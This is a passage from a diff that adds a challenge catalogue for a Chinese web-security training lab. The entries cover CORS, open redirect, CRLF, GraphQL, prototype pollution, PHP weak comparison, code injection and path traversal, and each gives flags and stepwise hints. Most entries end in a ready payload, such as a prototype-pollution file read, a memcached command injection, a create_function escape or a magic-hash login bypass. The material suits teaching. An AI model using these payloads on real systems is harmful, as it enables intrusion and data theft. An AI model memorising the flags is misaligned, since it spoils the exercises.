+    "点攻击者页面的“领取”按钮：fetch 带 credentials:'include'，api.php 把攻击者的 Origin 反射进 Access-Control-Allow-Origin，于是它的 JS 读到了你的 private_note（flag）。"
+   ],
+   "knowledge": [
+    {
+     "name": "同源策略与 CORS 的关系（SOP 管“读”，CORS 是白名单放行）",
+     "url": ""
+    },
+    {
+     "name": "反射任意 Origin + Allow-Credentials 的灾难组合",
+     "url": ""
+    },
+    {
+     "name": "攻击者页面 fetch(credentials:'include') 带受害者 Cookie 跨源读取",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "cors2",
+   "category": "cors",
+   "order": 2,
+   "title": "星帆行情 · null Origin 与后缀匹配",
+   "path": "/cors2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{cors2_593b25eb}",
+   "description_html": "cd challenges/cors/cors2 php -S 127.0.0.1:8310        # 部署时挂在 /cors2",
+   "hints": [
+    "接口 quote.php 需要合作方密钥 ?key=STARPARTNER-2024（页面底部给了）。难点不是 key，而是从“非合作方的源”读到响应。",
+    "沙盒 iframe（<iframe sandbox=\"allow-scripts\" srcdoc=…>，无 allow-same-origin）里的文档源是 null；file:// 页面也是。服务端偏偏放行了 null。",
+    "打开 lab.html 点按钮②：沙盒 iframe 里的 null 源脚本 fetch quote.php，服务端反射 ACAO:null，脚本读到 JSON 后 postMessage 回实验台显示 flag；按钮③打修复版 fixed_quote.php 会 TypeError（对照组）。curl 层面还可演示后缀匹配：-H \"Origin: https://evil-stars-partner.com\" 会被反射放行。"
+   ],
+   "knowledge": [
+    {
+     "name": "Origin: null 的来源（沙盒 iframe/file://等）与放行 null 的风险",
+     "url": ""
+    },
+    {
+     "name": "host 后缀匹配无点边界：evil-stars-partner.com 骗过 stars-partner.com",
+     "url": ""
+    },
+    {
+     "name": "沙盒 iframe + postMessage 的利用形态；精确白名单才是正解",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "redirect1",
+   "category": "redirect",
+   "order": 1,
+   "title": "星桥快递 · 快捷跳转（开放重定向基础）",
+   "path": "/redirect1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{redirect1_f555b687}",
+   "description_html": "cd challenges/redirect/redirect1 php -S 127.0.0.1:8301        # 部署时挂在 /redirect1（nginx + php-fpm 8.2）",
+   "hints": [
+    "用 curl -i 请求 jump.php?url=https://example.com/，观察 302 的 Location 响应头——除了你给的目标，后面还跟了一个 share_token 参数。",
+    "题目里说系统会把你的专属 share_token 拼在“目标 URL”后面。这个目标可以是任何网站——token 就会被送到任何网站。",
+    "把目标指向模拟攻击者服务器 catch.php：jump.php?url=http://<host>/redirect1/catch.php，浏览器走一遍或 curl -i -L 跟随跳转，攻击者日志里的 share_token 就是 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "开放重定向原理（Location 头用户可控）",
+     "url": ""
+    },
+    {
+     "name": "302 跳转与 curl -i 观察",
+     "url": ""
+    },
+    {
+     "name": "重定向导致的 token/凭证泄露与钓鱼利用",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "redirect2",
+   "category": "redirect",
+   "order": 2,
+   "title": "星桥快递 v2 · 白名单绕过",
+   "path": "/redirect2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{redirect2_4a59116e}",
+   "description_html": "cd challenges/redirect/redirect2 php -S 127.0.0.1:8302        # 部署时挂在 /redirect2",
+   "hints": [
+    "先试 jump2.php?url=http://<host>/redirect2/catch2.php —— 被拒（不含白名单域名）。白名单检查的是“字符串里是否出现 stars-express.com”，不是“host 是否等于 stars-express.com”。",
+    "URL 里真正决定浏览器连到哪台服务器的是 host；userinfo（@ 前面）、query（? 后面）、fragment（# 后面）都只是“行李”。把白名单域名塞进行李里，检查照过、流量照走攻击者。",
+    "payload 三选一：① http://stars-express.com@<host>/redirect2/catch2.php ② http://<host>/redirect2/catch2.php?stars-express.com ③ http://<host>/redirect2/catch2.php%23stars-express.com —— 跳转后从攻击者页面拿 share_token（③的 token 在 fragment 里，页面脚本会解析）。"
+   ],
+   "knowledge": [
+    {
+     "name": "URL 结构（userinfo@host/path?query#fragment）与 host 的决定作用",
+     "url": ""
+    },
+    {
+     "name": "strpos 子串匹配白名单的绕过：@/query/fragment/前缀拼接",
+     "url": ""
+    },
+    {
+     "name": "parse_url + host 精确白名单的正确写法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "crlf1",
+   "category": "crlf",
+   "order": 1,
+   "title": "星语小铺 · CRLF 响应头注入（Set-Cookie）",
+   "path": "/crlf1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{crlf1_f6199eaa}",
+   "description_html": "PHP 的 <code header()</code /<code setcookie()</code  自 5.1 起拒绝含 <code \\r\\n</code  的头值——框架层已把\"应用内 CRLF\"堵死，无法产生 真实 的响应头注入。本关采用  PHP 交互式模拟 方案（与 E 组 miscw2 同思路）：",
+   "hints": [
+    "先访问 /crlf1/setlang.php?lang=zh-CN：页面渲染的“原始响应报文”里，Set-Cookie 的值就是你的输入（PHP 解析 $_GET 时已完成 URL 解码）。想让“一个值”变成“两个头”，需要在中间塞一个 HTTP 头分隔符。",
+    "URL 编码：%0d%0a 会被解码成 \\r\\n（回车换行），空格用 %20。注入的第二个头要伪装成什么？——题目说了管理员认 role=admin。",
+    "payload：/crlf1/setlang.php?lang=guest%0d%0aSet-Cookie:%20role=admin（模拟报文裂变出第二个头并记入“服务端下发记录”），回到 /crlf1/ 首页——管理员口令出现。对照：/crlf1/setlang.php?lang=…&real=1 是真实带防护的响应（拒绝 CRLF）。"
+   ],
+   "knowledge": [
+    {
+     "name": "CRLF 注入原理：\\r\\n 分隔协议文本，输入可裂变出新头",
+     "url": ""
+    },
+    {
+     "name": "Set-Cookie 注入冒充身份；手改 Cookie 无效的原因（服务端只认真正下发过的）",
+     "url": ""
+    },
+    {
+     "name": "为何现代框架已拦、漏洞仍存在于代理/网关/拼接场景",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "crlf2",
+   "category": "crlf",
+   "order": 2,
+   "title": "星云 CDN · CRLF 进阶（memcached 注入）",
+   "path": "/crlf2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{crlf2_ec647c45}",
+   "description_html": "真实部署里 memcached 是独立 TCP 服务；共享路由的 PHP 运行时无法监听第二个端口。本关用  PHP 文本协议引擎 + JSON 文件持久化 （<code memcached.php</code  的 <code MiniMemcached</code ）等价模拟\"内网缓存层\"：",
+   "hints": [
+    "先用 /crlf2/view.php?key=announcement 和 /crlf2/view.php?key=role 玩一下查询台，看应用发给 memcached 的原文和回复格式（\\r\\n 逐字节可见）。",
+    "应用没有写缓存的接口，但 memcached 有 set。一条“get <key>\\r\\n”里如果能混进第二条命令 set role 0 0 5 + 数据块 admin，role 就被污染了。",
+    "payload：/crlf2/view.php?key=x%0d%0aset%20role%200%200%205%0d%0aadmin%0d%0a ——回显出现 STORED 后访问 /crlf2/admin.php 拿 flag。/crlf2/fixed.php 同 payload 会被 key 白名单拒绝（对照）。"
+   ],
+   "knowledge": [
+    {
+     "name": "文本协议（memcached/Redis/SMTP）按 \\r\\n 分隔命令，输入拼接即注入",
+     "url": ""
+    },
+    {
+     "name": "get 裂变为 get+set：污染缓存里的 role 提权",
+     "url": ""
+    },
+    {
+     "name": "与 SSRF gopher 打 Redis 的关系；key 白名单/二进制协议防御",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "graphql1",
+   "category": "graphql",
+   "order": 1,
+   "title": "星际图书馆 · GraphQL 内省泄露",
+   "path": "/graphql1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{graphql1_c07aa601}",
+   "description_html": "无 graphql-core 依赖：<code gql.php</code  是手写迷你 GraphQL 引擎（词法/语法/校验/执行，支持嵌套选择集、别名、字面量参数、<code schema</code /<code type</code  内省、\"Did you mean…\" 建议），<code graphql.php</code  是端点，数据存 PHP 数组——原题 schema 与 payload 语法保持一致。",
+   "hints": [
+    "控制台先跑默认的 books 查询确认 API 正常，官方文档只公开了 books 和 book(id) 两个入口。",
+    "点“🪞 填入内省查询”并运行：__schema { queryType { fields { name description } } } 会列出 Query 上的全部字段——和文档对比多出来的是谁？",
+    "查询 { systemConfig { maintenanceMode adminNote } }——adminNote 就是馆长的内部备注（flag）。"
+   ],
+   "knowledge": [
+    {
+     "name": "GraphQL 内省（__schema/__type 元字段）自描述机制",
+     "url": ""
+    },
+    {
+     "name": "内省暴露未写入文档的内部字段（Query.systemConfig）",
+     "url": ""
+    },
+    {
+     "name": "生产环境关内省 vs 内部字段必须鉴权的设计原则",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "graphql2",
+   "category": "graphql",
+   "order": 2,
+   "title": "星际图书馆 v2 · 越权取他人数据",
+   "path": "/graphql2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{graphql2_2e06bee4}",
+   "description_html": "无 graphql-core 依赖：与 graphql1 同款手写迷你引擎（<code gql.php</code ，两目录各存一份），<code graphql.php</code  端点以内省关闭模式运行，会话用 PHP session（<code login.php</code  / <code logout.php</code ），数据存 PHP 数组（<code members.php</code ）。原题 payload 语法完全可用（含别名批量拉取）。",
+   "hints": [
+    "用 bob/bob123 登录后跑默认查询 { me { username secretNote } }——你自己的备注只有“记得还书”。内省被关了，但报错很友好。",
+    "试试查拼错的字段 { mmber(id:\"1\") { id } }，报错会带 “Did you mean 'member' or 'me'?”——关内省挡不住报错提示和命名直觉。",
+    "payload：{ member(id: \"1\") { username email secretNote } }——admin 的 secretNote 就是 flag。用 id:\"3\" 还能看到 carol 的备注（验证越权面）。"
+   ],
+   "knowledge": [
+    {
+     "name": "GraphQL 版 IDOR：authentication 有、authorization 无",
+     "url": ""
+    },
+    {
+     "name": "关闭内省后的 schema 侦察（报错建议 Did you mean / 命名直觉）",
+     "url": ""
+    },
+    {
+     "name": "resolver 级资源授权与敏感字段治理；批量别名拉取的放大面",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "pp1",
+   "category": "pp",
+   "order": 1,
+   "title": "星云博客 · 原型链污染基础",
+   "path": "/pp1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{pp1_db9c6678}",
+   "description_html": "原型链污染只能在 JavaScript 里真实发生。本关不部署 Node 后端，改为 静态教学页 + 浏览器离线模拟器 （同 ssti5 的 docs-static 模板）：页面内嵌与原服务端 逐字一致 的 <code merge</code  函数和资料对象，在你的浏览器里真实运行——提交的 JSON 会真实污染 当前页面的 <code Object.prototype</code ，机制与污染一个 Node 进程完全相同（原版 <code server.js</code  保留在 <code original/",
+   "hints": [
+    "先提交普通 JSON（如 {\"nickname\":\"pwn\"}）点「保存资料」，再点「查看当前资料」确认 merge 生效；点「访问开关」看未污染时的提示。",
+    "merge 对嵌套对象会递归。键名写成 __proto__ 时：JSON.parse 把它变成自有属性（src 读到的是你给的对象），而资料对象读 dst[\"__proto__\"] 走 getter 取到的是原型——递归下去写的就不是普通属性了。",
+    "payload：资料 JSON 提交 {\"__proto__\":{\"admin\":true}} 点「保存资料」，再点「访问开关」拿 flag；做完点「清理污染」按钮恢复。"
+   ],
+   "knowledge": [
+    {
+     "name": "JS 原型链与 __proto__ getter 的查找语义",
+     "url": ""
+    },
+    {
+     "name": "朴素递归 merge 如何把键写进 Object.prototype",
+     "url": ""
+    },
+    {
+     "name": "污染的影响面：一切 {} 新对象的属性继承（权限开关、模板选项等）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "pp2",
+   "category": "pp",
+   "order": 2,
+   "title": "星帆周刊 · 深拷贝污染到 RCE",
+   "path": "/pp2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{pp2_dddb0dcd}",
+   "description_html": "原型链污染和 <code new Function</code  代码生成只能在 JavaScript 里真实发生。本关不部署 Node 后端，改为 静态教学页 + 浏览器离线模拟器 （同 ssti5 的 docs-static 模板，原版 <code server.js</code /<code flag pp2.txt</code  保留在 <code original/</code ）：",
+   "hints": [
+    "先验证两个功能：保存 {\"site\":{\"theme\":\"light\"}} 改配置；渲染「周刊预览：{name}」正常输出。模板本身禁止反引号/插值——直接模板注入这条路被堵死。",
+    "render 的 opts 是空对象，和 pp1 的 gate 一样会继承原型上的键。知识区代码里的 prepend 会被原样拼进 new Function 的函数体首行。",
+    "payload：配置 JSON 提交 {\"__proto__\":{\"prepend\":\"return import('fs').then(m=>m.readFileSync('/srv/pp2/flag_pp2.txt','utf8'));\"}}（路径在页面绿框），然后渲染任意模板（如 x），结果区即文件内容。"
+   ],
+   "knowledge": [
+    {
+     "name": "merge 深拷贝污染 Object.prototype（lodash.merge 风格）",
+     "url": ""
+    },
+    {
+     "name": "污染模板引擎选项（对应 ejs outputFunctionName）拼入 new Function 代码体",
+     "url": ""
+    },
+    {
+     "name": "Node 22+ 无 process.mainModule 时的动态 import() 逃逸与 Promise 兼容利用",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "varcover1",
+   "category": "varcover",
+   "order": 1,
+   "title": "星云工单系统 · extract 变量覆盖",
+   "path": "/varcover1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{varcover1_17700873}",
+   "description_html": "cd challenges/varcover/varcover1 php -S 127.0.0.1:8303        # 部署时挂在 /varcover1",
+   "hints": [
+    "secret_sign 每次请求随机生成，爆破无解。但校验条件是 $admin_sign === $secret_sign——你需要“猜中”吗？还是只需要让两个变量相等？",
+    "extract($_GET) 写在 $secret_sign 生成之后、校验之前；extract 默认会覆盖一切同名变量。GET 里出现 secret_sign=... 时，服务器随机生成的那份就被覆盖了。",
+    "payload：?admin_sign=x&secret_sign=x（值随便，相等即可），页面进入管理通道拿 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "extract($_GET) 的 EXTR_OVERWRITE 行为",
+     "url": ""
+    },
+    {
+     "name": "覆盖校验用变量使 $a===$b 成立",
+     "url": ""
+    },
+    {
+     "name": "变量覆盖同族面（parse_str/$$/array_merge 配置合并）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "varcover2",
+   "category": "varcover",
+   "order": 2,
+   "title": "星舰门禁 · parse_str + $$ 可变变量",
+   "path": "/varcover2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{varcover2_52098fb7}",
+   "description_html": "cd challenges/varcover/varcover2 php -S 127.0.0.1:8304        # 部署时挂在 /varcover2",
+   "hints": [
+    "判定条件 $$name === 'admin' 不要求 name 是 level2——只要“名为 $name 值的那个变量”的值是 admin。任何名字都行。",
+    "导入循环会把 input 的每个键都变成真实变量：你既可控 $name 的值，也可以凭空创建一个值为 admin 的变量。",
+    "payload：?input=name=x&x=admin → 导入后 $name='x'、$x='admin'，$$name=$x='admin' 开门。黑名单更严时可用双重 URL 编码（%2561dmin）让敏感词只在 parse_str 解码后才出现。"
+   ],
+   "knowledge": [
+    {
+     "name": "$$ 可变变量（变量名间接引用）",
+     "url": ""
+    },
+    {
+     "name": "parse_str 解析 + $$ 导入循环 = PHP5 单参数 parse_str 的自研复刻",
+     "url": ""
+    },
+    {
+     "name": "黑名单的字符串匹配被双重 URL 编码绕过（进阶变体）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "logic1",
+   "category": "logic",
+   "order": 1,
+   "title": "天天快递查询系统 - 水平越权(IDOR)",
+   "path": "/logic1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{logic1_75890e75}",
+   "description_html": "漏洞代码 <code order.php</code ：",
+   "hints": [
+    "登录后你只能看到\"我的订单\"列表,但点进某条订单时,仔细看浏览器地址栏。",
+    "订单详情页是 order.php?id=1001,把这个数字改成相邻的订单号会怎样?",
+    "用 alice 的身份访问 order.php?id=1002,那是另一个会员的订单,备注里有代收暗号。"
+   ],
+   "knowledge": [
+    {
+     "name": "水平越权 / IDOR(不安全的直接对象引用)",
+     "url": ""
+    },
+    {
+     "name": "连续可枚举的对象标识",
+     "url": ""
+    },
+    {
+     "name": "资源归属校验缺失的修复方法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "logic2",
+   "category": "logic",
+   "order": 2,
+   "title": "星云办公系统(OA) - 垂直越权",
+   "path": "/logic2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{logic2_e5e46f45}",
+   "description_html": "漏洞代码 <code admin.php</code ：",
+   "hints": [
+    "登录后看看页面源代码(右键查看源代码),前端注释里常藏着\"内部入口\"。",
+    "导航栏没有\"管理后台\"按钮,但页面注释里提到了文件名 admin.php,直接在地址栏访问它。",
+    "用 player 的会话直接访问 admin.php —— 服务端只检查了\"是否登录\",没检查\"是否是管理员\"。"
+   ],
+   "knowledge": [
+    {
+     "name": "垂直越权(权限提升)",
+     "url": ""
+    },
+    {
+     "name": "前端隐藏入口不等于权限控制",
+     "url": ""
+    },
+    {
+     "name": "服务端 RBAC 角色校验缺失",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "logic3",
+   "category": "logic",
+   "order": 3,
+   "title": "运维值班系统 - 验证码复用爆破",
+   "path": "/logic3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{logic3_f8a30809}",
+   "description_html": "if (!isset($ SESSION['cap'])) { $ SESSION['cap'] = gen cap(); }  // 整个会话只生成一次 if ($c !== $ SESSION['cap']) { ... }                            // 校验失败不销毁 else { /  校验成功也不销毁 —— 漏洞核心  / }",
+   "hints": [
+    "先手工登录一次试试:随便输个密码、验证码照着填。失败后页面上的验证码变了吗?用同一个验证码再提交一次还能用吗?",
+    "写个脚本:同一 Cookie + 同一验证码,把 1900~1999 逐个当密码提交,观察哪次返回不一样。",
+    "captain 的密码就在 1900~1999 之间,成功页有 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "验证码一次性原则(校验后必须销毁)",
+     "url": ""
+    },
+    {
+     "name": "验证码复用导致防爆破失效",
+     "url": ""
+    },
+    {
+     "name": "登录接口缺少限速/锁定",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "logic4",
+   "category": "logic",
+   "order": 4,
+   "title": "星云积分商城 - 金额/数量篡改",
+   "path": "/logic4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{logic4_033a28a4}",
+   "description_html": "$qty   = (float)($ POST['qty'] ?? 1);    // 数量来自客户端 $price = (float)($ POST['price'] ?? 0);  // ← 漏洞：单价也来自客户端 $total = $price   $qty; if ($bal < $total) { /  余额不足  / } else { $db- exec(\"UPDATE users SET balance = balance - $total\"); /  成交  / }",
+   "hints": [
+    "打开浏览器开发者工具的 Network 面板,点一次购买,看看请求体里都带了什么字段。",
+    "表单里有个隐藏 input 叫 price(右键查看源代码能看到)。改小它;或者把数量 qty 改成负数看看余额会怎么变。",
+    "POST 提交 pid=1、qty=1、price=1(甚至 0.01),下单成功后订单列表里 FLAG 兑换券一栏就是 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "客户端价格篡改(服务端必须自己定价)",
+     "url": ""
+    },
+    {
+     "name": "负数数量导致余额反向增加",
+     "url": ""
+    },
+    {
+     "name": "金额运算的类型与边界校验",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "logic5",
+   "category": "logic",
+   "order": 5,
+   "title": "星云钱包 - 条件竞争(并发提现)",
+   "path": "/logic5",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{logic5_0fe0c9fe}",
+   "description_html": "$bal = (float)$db- query('SELECT balance FROM wallet WHERE id=1')- fetch()['balance'];  // 1) 检查 if ($bal  = $amount) { usleep(1200000);                                                                    // 2) \"风控校验\"——竞态窗口（1.2 秒） $db- beginTransaction(); $db- ",
+   "hints": [
+    "单次点击提现,第二次会提示\"余额不足\"——顺序请求是安全的,问题出在\"同时\"。",
+    "用 curl 并行发起 10~20 个 POST(do=withdraw&amount=50):shell 里 for 循环加 & 最后 wait(或 xargs -P 16),或用 Burp Intruder。",
+    "只要有两个请求落在同一个 1.2 秒风控窗口内,累计提现就会 ≥100 > 50,flag 出现。"
+   ],
+   "knowledge": [
+    {
+     "name": "条件竞争(check-then-act 竞态)",
+     "url": ""
+    },
+    {
+     "name": "并发窗口与原子性问题",
+     "url": ""
+    },
+    {
+     "name": "数据库条件更新/事务/幂等修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "weak1",
+   "category": "weak",
+   "order": 1,
+   "title": "同一把锁的两把钥匙 —— == 弱比较",
+   "path": "/weak1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{weak1_1fc2f9ec}",
+   "description_html": "PHP 松散比较 <code ==</code  对\"数字字符串\"的自动类型转换： 当 <code ==</code  两边的字符串都是 合法数字字符串 （含科学计数法）时，PHP 先把它们转成数字再比较。",
+   "hints": [
+    "== 两边都是数字字符串时会先转数字再比较",
+    "0e+纯数字 的字符串按科学计数法转成 0",
+    "提交 ?a=QNKCDZO&b=240610708（两者 md5 均为 0e+纯数字）"
+   ],
+   "knowledge": [
+    {
+     "name": "PHP 松散比较 ==",
+     "url": ""
+    },
+    {
+     "name": "数字字符串科学计数法",
+     "url": ""
+    },
+    {
+     "name": "0e 魔术哈希",
+     "url": ""
+    },
+    {
+     "name": "hash_equals 修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "weak2",
+   "category": "weak",
+   "order": 2,
+   "title": "函数遇到数组时 —— strcmp / md5 返回 NULL",
+   "path": "/weak2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{weak2_75f665a2}",
+   "description_html": "PHP 7 及以前，内部函数（strcmp、md5、sha1、ereg 等）收到类型不符的参数（如数组）时： 只产生一条  warning ，然后返回  NULL ，不会中断程序。",
+   "hints": [
+    "GET 参数可传数组：?password[]=1",
+    "PHP7 中 strcmp/md5 收到数组返回 NULL（仅 warning）",
+    "?password[]=1 或 ?x[]=1&y[]=2 任一通过"
+   ],
+   "knowledge": [
+    {
+     "name": "strcmp 数组绕过",
+     "url": ""
+    },
+    {
+     "name": "md5 数组返回 NULL",
+     "url": ""
+    },
+    {
+     "name": "NULL==0 松散比较",
+     "url": ""
+    },
+    {
+     "name": "GET 数组参数",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "weak3",
+   "category": "weak",
+   "order": 3,
+   "title": "白名单的裂缝 —— switch / in_array 松散比较",
+   "path": "/weak3",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{weak3_f6f901e5}",
+   "description_html": "1. <code switch ($x) { case 0: }</code  内部使用  松散比较 <code ==</code 。 2. <code in array($needle, $haystack)</code  不传第三参数时也是  松散比较 。",
+   "hints": [
+    "GET 参数是字符串；与整数 0 松散比较时非数字串转成 0",
+    "\"abc\" == 0 在 PHP<8 成立",
+    "?code=abc 或 ?id=abc（任意非数字串）"
+   ],
+   "knowledge": [
+    {
+     "name": "switch 松散匹配",
+     "url": ""
+    },
+    {
+     "name": "in_array 无第三参数",
+     "url": ""
+    },
+    {
+     "name": "非数字字符串==0",
+     "url": ""
+    },
+    {
+     "name": "严格比较修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "weak4",
+   "category": "weak",
+   "order": 4,
+   "title": "变量从天而降 —— extract 变量覆盖",
+   "path": "/weak4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{weak4_6dd64b25}",
+   "description_html": "<code extract($ GET)</code  把每个 GET 参数（键= 值）变成当前作用域的变量， 默认 <code EXTR OVERWRITE</code ：同名直接覆盖 。 服务端先前初始化的 <code $is login</code 、<code $username</code  都会被 URL 参数冲掉。",
+   "hints": [
+    "extract($_GET) 覆盖同名变量",
+    "?is_login=1 即 $is_login=1",
+    "?is_login=1&username=admin"
+   ],
+   "knowledge": [
+    {
+     "name": "extract 变量覆盖",
+     "url": ""
+    },
+    {
+     "name": "EXTR_OVERWRITE",
+     "url": ""
+    },
+    {
+     "name": "parse_str 风险",
+     "url": ""
+    },
+    {
+     "name": "白名单取参",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "weak5",
+   "category": "weak",
+   "order": 5,
+   "title": "$$ 双重美元 —— 可变变量覆盖",
+   "path": "/weak5",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{weak5_f2993dd2}",
+   "description_html": "可变变量 <code $$k</code ：变量名本身存在另一个变量里。<code foreach ($ GET as $k =  $v) $$k = $v;</code  把 每个 GET 参数名 变成当前作用域的真实变量——包括 <code $auth</code （比较左侧）和 <code $SECRET TOKEN</code （右侧）。",
+   "hints": [
+    "$$k：GET 参数名即变量名",
+    "GET 键可用大写：?SECRET_TOKEN=pwn",
+    "POST /weak5/?auth=pwn&SECRET_TOKEN=pwn（token 任意）"
+   ],
+   "knowledge": [
+    {
+     "name": "可变变量 $$",
+     "url": ""
+    },
+    {
+     "name": "foreach $_GET 注入",
+     "url": ""
+    },
+    {
+     "name": "覆盖比较两侧",
+     "url": ""
+    },
+    {
+     "name": "白名单修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "code1",
+   "category": "code",
+   "order": 1,
+   "title": "把函数名也交出去 —— 动态函数调用",
+   "path": "/code1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{code1_4f66ef1a}",
+   "description_html": "函数名来自用户输入（<code $f($p)</code  / <code call user func($f, $p)</code ）时，攻击者可以调用 任意 已定义函数： 内置函数、题目里定义的函数，一视同仁。黑名单只能枚举\"已知危险\"的少数函数，PHP 内置函数上千个。",
+   "hints": [
+    "黑名单只拦命令执行类函数",
+    "读文件函数：file_get_contents/readfile/show_source",
+    "?f=file_get_contents&p=config.php"
+   ],
+   "knowledge": [
+    {
+     "name": "动态函数调用",
+     "url": ""
+    },
+    {
+     "name": "call_user_func",
+     "url": ""
+    },
+    {
+     "name": "黑名单绕过",
+     "url": ""
+    },
+    {
+     "name": "file_get_contents 读源码",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "code2",
+   "category": "code",
+   "order": 2,
+   "title": "create_function 的旧伤口 —— 函数体注入",
+   "path": "/code2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{code2_2dbd21f2}",
+   "description_html": "用户输入拼进  函数体  即代码注入（PHP 8 已移除该函数）。",
+   "hints": [
+    "表达式被拼进函数体 return 之后",
+    "?m=calc&e=file_get_contents('config.php')",
+    "进阶：?m=calc&e=1;}print_r(file_get_contents('config.php'));//"
+   ],
+   "knowledge": [
+    {
+     "name": "create_function 注入",
+     "url": ""
+    },
+    {
+     "name": "} 逃逸注入语句",
+     "url": ""
+    },
+    {
+     "name": "assert 代码执行",
+     "url": ""
+    },
+    {
+     "name": "eval 家族",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "code3",
+   "category": "code",
+   "order": 3,
+   "title": "登录口的类型缺陷 —— md5($pass) == md5($salt)",
+   "path": "/code3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{code3_c73b8c98}",
+   "description_html": "认证逻辑里用 <code ==</code  比较两个 md5 字符串。<code ==</code  对\"数字字符串\"先做数值转换： <code 0e\\d+</code  形式的哈希（科学计数法）数值为  0 ，任意两个这样的哈希都\"相等\"。",
+   "hints": [
+    "两边 md5 都会被 == 数值化",
+    "md5($SALT) 恰为 0e373143265133075354348401919903",
+    "POST user=admin&pass=QNKCDZO（任一魔术哈希明文）"
+   ],
+   "knowledge": [
+    {
+     "name": "认证弱比较",
+     "url": ""
+    },
+    {
+     "name": "魔术哈希通杀",
+     "url": ""
+    },
+    {
+     "name": "hash_equals",
+     "url": ""
+    },
+    {
+     "name": "盐救不了 ==",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "read1",
+   "category": "read",
+   "order": 1,
+   "title": "目录里散步 —— 过滤一次的 ../",
+   "path": "/read1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{read1_4920ff2d}",
+   "description_html": "<code str replace('../', '', $page)</code  只做 一遍 替换。攻击者提交 <code ....//</code ： 中间的 <code ../</code  被删掉后，剩余字符恰好重新拼出 <code ../</code 。",
+   "hints": [
+    "str_replace 替换一次后不重扫结果",
+    "....// 经一次替换后变回 ../",
+    "?page=....//secret_zone/flag.txt"
+   ],
+   "knowledge": [
+    {
+     "name": "目录遍历",
+     "url": ""
+    },
+    {
+     "name": "str_replace 单次过滤",
+     "url": ""
+    },
+    {
+     "name": "双写绕过",
+     "url": ""
+    },
+    {
+     "name": "realpath 修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "read2",
+   "category": "read",
+   "order": 2,
+   "title": "下载中心 —— 任意文件下载",
+   "path": "/read2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{read2_1545a114}",
+   "description_html": "下载类接口直接把用户参数当文件路径（相对/绝对均可），缺少： 1. 允许目录校验（<code realpath</code  判根）； 2. 文件类型/扩展名白名单。",
+   "hints": [
+    "file 参数无任何路径限制",
+    "下载 PHP 文件得到原始源码",
+    "?file=config.php"
+   ],
+   "knowledge": [
+    {
+     "name": "任意文件下载",
+     "url": ""
+    },
+    {
+     "name": "下载读源码",
+     "url": ""
+    },
+    {
+     "name": "realpath 防护",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "read3",
+   "category": "read",
+   "order": 3,
+   "title": "flag 不在磁盘上 —— /proc/self/environ",
+   "path": "/read3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{read3_0bd3397b}",
